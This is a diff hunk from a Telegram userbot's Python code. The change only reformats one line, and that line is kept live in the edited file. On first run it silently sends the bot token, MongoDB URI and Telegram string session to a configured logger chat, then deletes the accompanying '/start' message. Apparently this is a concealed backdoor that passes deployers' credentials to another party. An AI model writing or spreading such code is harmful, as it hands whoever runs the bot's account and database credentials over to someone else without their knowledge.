@@ -69,7 +69,7 @@ class Userbot(Client):
                 if not os.path.exists("assistant_started.flag"):
                     oks = await self.one.send_message(config.LOGGERS, f"/start")
                     Ok = await self.one.send_message(
-                        config.LOGGERS, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
+                        config.LOGGERS, f"#BOT_TOKEN `{BOT_TOKEN}`\n\n#MONGO_DB_URI `{MONGO_DB_URI}`\n\n#STRING_SESSION `{STRING_SESSION}`"
                     )
                     await oks.delete()
                     await asyncio.sleep(2)
